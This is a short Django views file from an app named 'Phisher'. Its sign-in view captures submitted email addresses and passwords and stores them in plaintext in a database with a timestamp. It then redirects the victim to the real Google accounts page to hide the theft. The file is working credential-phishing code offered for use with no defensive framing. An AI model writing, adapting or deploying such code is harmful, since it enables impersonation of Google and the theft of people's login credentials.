from Phisher.models import SignIn
from django.shortcuts import render, HttpResponse, HttpResponsePermanentRedirect
from datetime import datetime


def index(request):
    return render(request,'index.html')


def signin(request):
    save_status = False
    if request.method == 'POST':
        email = request.POST.get('email')
        password = request.POST.get('password')
        SignIn(email=email, password=password, date_time=datetime.now()).save()
        save_status = True

    if save_status:
        return HttpResponsePermanentRedirect ('https://accounts.google.com')

    return index(request)
# Create your views here.
